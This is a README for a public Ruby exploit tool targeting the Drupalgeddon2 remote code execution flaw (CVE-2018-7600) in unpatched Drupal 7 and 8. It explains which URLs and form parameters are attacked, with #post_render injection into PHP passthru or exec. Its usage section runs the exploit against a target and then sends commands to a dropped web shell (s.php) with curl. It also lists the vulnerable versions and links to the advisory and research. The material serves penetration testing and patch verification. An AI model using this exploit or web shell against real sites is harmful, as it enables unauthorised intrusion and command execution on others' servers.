# CVE-2018-7600 | Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' RCE (SA-CORE-2018-002)

[Drupalggedon2 - https://github.com/dreadlocked/Drupalgeddon2/](https://github.com/dreadlocked/Drupalgeddon2/) _([https://www.drupal.org/sa-core-2018-002](https://www.drupal.org/sa-core-2018-002))_

- [Hans Topo](https://github.com/dreadlocked)
- [g0tmi1k](https://blog.g0tmi1k.com/)

Supports:
- < 7.58 ~ `user/password` URL, attacking `triggering_element_name` form & `#post_render` parameter, using PHP's `passthru` function.
- < 8.3.9 / < 8.4.6 / < 8.5.1 ~ `user/register` URL, attacking `account/mail` AJAX & `#post_render` parameter, using PHP's `exec` function.

This method was chosen, as it will return `HTTP 200`, and render the output in the `data` JSON response _(un-comment the code for `timezone`/`#lazy_builder` method, which will return `HTTP 500` & blind!)_ {[More Information](https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708)}.

- - -

#### Usage:

```bash
$ ruby drupalgeddon2.rb https://example.com
```

...afterwards, just call: `curl 'https://example.com/s.php' -d 'c=whoami'`

For proxy support, edit the file, replacing with your values. Example:

```ruby
proxy_addr = '192.168.0.130'
proxy_port = 8080
```

- - -

#### Drupal Information:

Drupal Advisory ~ https://www.drupal.org/sa-core-2018-002

Vulnerable Versions (Check: https://example.com/CHANGELOG.txt):

* < 7.58        **(Tested)**
* 8.x < 8.3.9
* 8.4.x < 8.4.6 **(Tested)**
* 8.5.x < 8.5.1 **(Tested)**

- - -

#### Links:

- **Write up & Research** ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
- Drupal Advisory ~ https://www.drupal.org/sa-core-2018-002
- Original Python PoC ~ https://github.com/a2u/CVE-2018-7600
- cURL commands ~ https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708
- CVE ~ https://nvd.nist.gov/vuln/detail/CVE-2018-7600
